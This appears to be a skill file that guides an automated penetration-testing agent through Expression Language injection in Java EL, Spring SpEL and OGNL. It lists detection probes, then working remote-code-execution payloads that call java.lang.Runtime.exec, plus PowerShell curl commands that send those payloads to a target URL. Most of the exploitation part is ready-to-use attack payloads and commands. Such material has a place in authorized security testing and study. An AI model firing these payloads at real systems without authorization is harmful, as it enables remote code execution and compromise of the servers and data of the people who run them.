---
name: el-injection
description: Expression Language injection (Java EL, Spring SpEL, OGNL, Apache Commons EL) — `${...}`/`#{...}` template evaluation leading to RCE or SSRF. Use when app uses JSP/Spring/Tapestry/Struts templates or reflects user input into EL context.
category: injection
---

# Expression Language Injection (EL / SpEL / OGNL)

## Detection
- App stack = Java (JSESSIONID, `.jsp`, Spring Boot headers, Struts/WebLogic/Tapestry).
- Input appears in EL context: search boxes, i18n keys, error templates, redirect targets with `${param}`.
- Probe `${7*7}` → response contains `49` (arithmetic evaluated).

## Exploitation
1. **Confirmation**: `${7*7}`, `#{7*7}`, `%{7*7}`.
2. **Reflection read**: `${T(java.lang.System).getenv()}` (SpEL), `${request.getSession()}`.
3. **RCE (classic SpEL payload)**:
```
${T(java.lang.Runtime).getRuntime().exec('id')}
```
4. **RCE via process builder (tomcat EL)**:
```
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```
5. **OGNL (Struts2)**: `%{2*2}` then `%{@java.lang.Runtime@getRuntime().exec('id')}`.

## Tool Commands (Windows)
```powershell
# arithmetic confirmation
curl.exe -s "$U/search?q=%24%7B7*7%7D" | Select-String -Pattern '49'
# RCE probe
curl.exe -s "$U/search?q=%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D"
```

## Verification & Evidence
- Arithmetic evaluated OR command execution (DNS/OOB callback or response artifact).
- Evidence: input → evaluated output pair.